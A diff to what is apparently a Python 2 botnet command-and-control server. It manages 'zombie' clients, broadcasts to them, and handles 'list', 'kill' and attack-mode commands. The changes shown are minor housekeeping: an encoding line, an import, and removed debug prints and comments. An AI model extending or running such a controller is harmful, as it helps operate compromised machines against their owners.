@@ -1,5 +1,7 @@
+#coding: utf-8
 import socket
 import thread
+import sys
 import re
 class SocketServer(socket.socket):
     clients = []
@@ -70,7 +72,6 @@ class SocketServer(socket.socket):
         client.close()
         #Closing thread
         thread.exit()
-        print self.clients
 
     def broadcast(self, message):
         #Sending message to all zombie clients
@@ -104,7 +105,6 @@ class BasicChatServer(SocketServer):
         SocketServer.__init__(self)
 
     def onmessage(self, client, message,role):
-        #print role.capitalize() + " Sent Message:",
         data = message.rstrip()
         #List of zombies connected
         if data == "list":
@@ -123,7 +123,6 @@ class BasicChatServer(SocketServer):
             client.send("Attack mode interrupted\n")
 
         elif data.startswith("kill"):
-            # TODO: Tá quebrando com remoção fora de ordem (provavelmente posicao da lista nao atualizada, self.clients com tamanho errado)
             zombie_id = data.strip()[-1]
             if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
                 print "Killing zombie " + zombie_id
